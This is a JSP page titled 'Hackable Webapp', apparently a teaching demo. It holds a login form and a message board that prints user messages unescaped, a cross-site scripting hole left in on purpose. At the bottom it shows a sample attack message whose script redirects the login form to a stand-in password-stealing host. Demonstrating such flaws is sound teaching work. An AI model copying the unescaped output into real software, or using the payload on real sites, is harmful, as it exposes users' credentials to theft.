<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="f" uri="http://www.springframework.org/tags/form"%>
<html>
<head>
<title>Hackable Webapp</title>
</head>
<body>

<div style="float: right; margin: 3em">

<h3>Login</h3>

<f:form action="/login"  commandName="loginForm">
	<table>
		<tr>
			<td>User Name: <span style="color: Red"><f:errors path="userName" /></span></td>
		</tr>
		<tr>
			<td><f:input path="userName" /></td>
		</tr>
		<tr>
			<td>Password: <span style="color: Red"><f:errors path="password" /></span></td>
		</tr>
		<tr>
			<td><f:password path="password" /></td>
		</tr>
		<tr>
			<td><input type="submit" value="Submit" /></td>
		</tr>
	</table>
</f:form>

</div>

<div style="padding: 1em;">

<h2>Message Board</h2>

<c:forEach var="message" items="${messages}">
  <p>${message}</p>
</c:forEach>

<f:form action="/message"  commandName="messageForm">
    <p><b>Write message:</b>
	<br><f:textarea path="message" />
	<br><input type="submit" value="Submit" />
	<br><span style="color: Red"><f:errors path="message" /></span>
    </p>
</f:form>

</div>

<div style="margin-top: 5em;">

An example of a message for hacking this site:
<pre>
&lt;script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js" type="text/javascript">&lt;/script>
&lt;script type="text/javascript">
$("form#loginForm").attr("action", "http://hackers-site-which-steals-your-password");
&lt;/script>
</pre>

</div>

</body>
</html>
